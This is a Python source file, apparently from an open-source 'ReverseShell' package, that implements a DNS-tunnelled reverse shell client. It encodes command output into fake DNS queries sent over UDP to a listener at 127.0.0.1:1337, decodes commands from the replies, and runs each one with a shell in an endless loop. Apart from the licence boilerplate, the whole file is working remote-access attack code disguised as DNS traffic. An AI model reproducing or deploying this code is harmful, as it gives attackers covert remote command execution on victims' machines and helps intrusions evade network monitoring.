#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements an advanced reverse shell console.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""

__version__ = "0.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ReverseShell"

copyright = """
ReverseShell  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = []

print(copyright)

from socket import socket, AF_INET, SOCK_DGRAM
from base64 import b16decode, b16encode
from subprocess import run, PIPE
from contextlib import suppress


def generate_query(data: bytes) -> bytes:
    query = bytearray(
        query_base.copy()
        + (len(data[:5]) * 2).to_bytes(1, "big")
        + b16encode(data[:5])
    )
    data = data[5:]
    while len(data) > 50:
        query += b"\x64" + b16encode(data[:50])
        data = data[50:]
    if data:
        query += (len(data) * 2).to_bytes(1, byteorder="big") + b16encode(data)
    return query + b"\x00\x00\x01\x00\x01"


def parse_query(data: bytes) -> bytes:
    query = data[12:].split(b"\x00")[0]
    data = bytearray()

    while query:
        length = query[0] + 1
        data += b16decode(query[1:length])
        query = query[length:]

    return data


query_base = bytearray()
query_base += (1234).to_bytes(2, byteorder="big")
query_base += (0b0000000100000000).to_bytes(2, byteorder="big")
query_base += (1).to_bytes(2, byteorder="big")
query_base += (0).to_bytes(2, byteorder="big")
query_base += (0).to_bytes(2, byteorder="big")
query_base += (0).to_bytes(2, byteorder="big")

while True:
    sock = socket(AF_INET, SOCK_DGRAM)
    data = b" "
    while True:
        sock.sendto(generate_query(data), ("127.0.0.1", 1337))
        command, _ = sock.recvfrom(65535)
        command = parse_query(command).decode()
        p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
        data = p.stdout or p.stderr or b" "
